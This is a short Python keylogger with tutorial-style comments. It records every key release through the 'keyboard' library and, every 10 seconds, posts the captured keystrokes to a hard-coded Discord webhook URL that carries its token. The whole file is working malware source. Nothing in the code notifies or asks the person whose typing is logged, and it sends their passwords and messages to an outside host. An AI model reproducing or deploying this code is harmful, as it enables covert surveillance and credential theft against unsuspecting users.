import keyboard
import time
import requests
import threading

# Input my discord webhook server link below
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1445294203755303073/kjqrwQFK9KPkvzQocDgsIn4F5i3cp9uObvrqeaLJd6P1ZRCUSp3MPys0TnVsrzNu1A_m'

# Make keylogs variable to save button keyboard that recorded
keylogs = []

# Make function for sending keylogs data to discord
def send_keylogs_to_discord():
    global keylogs

    if keylogs:
        # Converting keylogs to be string
        keylogs_string = ' '.join(keylogs) # this means is i wanna combine all the elements of the list with space so that it's easier to read

        # Make keylogs_data variable to sent to discord
        keylogs_data = { # keylogs_data is the data variable that I want to send to Discord
            'content': keylogs_string # content: the name of the header requested by Discord
        }

        # Make POST request to discord
        requests.post(DISCORD_WEBHOOK_URL, data=keylogs_data) # Sending keylog data using ‘data=’ parameter to a server address (DISCORD_WEBHOOK_URL) using POST method

        # Clean keylogs list up
        keylogs = []

        # A. Flow of the function:
        # •  For 10 seconds → the buttons are recorded in the keylog list.
        # •  When the timer runs → the list is sent to Discord.
        # •  After sending → the list is cleared so it is not sent again.

        # B.If it is not cleared, then:
        # • old data + new data will be mixed,
        # • and old data will be sent again every 10 seconds (duplication).

    # Schedule the next execution after 10 sec
    threading.Timer(10, send_keylogs_to_discord).start()

    # A. If sending to the Discord server every 1 second:
    # •  It will flood the server
    # •  It will create spam
    # •  It could make discord server to be blocked

    # B. 10 seconds is a sufficient interval so that:
    # •  Data can be collected first
    # •  The sending is not too frequent

# Make function for take a every botton of keyboard
def take_letters_of_keyboard(letters):
    global keylogs

    keylogs.append(letters.name) #  append() is used to add letters to the end of a list.

keyboard.on_release(callback=take_letters_of_keyboard) # When keyboard botton is released, run take_letters_of_keyboard.

# Begin sending keylogs to discord every 10 sec
send_keylogs_to_discord() 

# Make program still alive
while True:
    time.sleep(1)

# while true: Repeat continuously without stop.
# time.sleep(1): Wait for 1 second before continue.
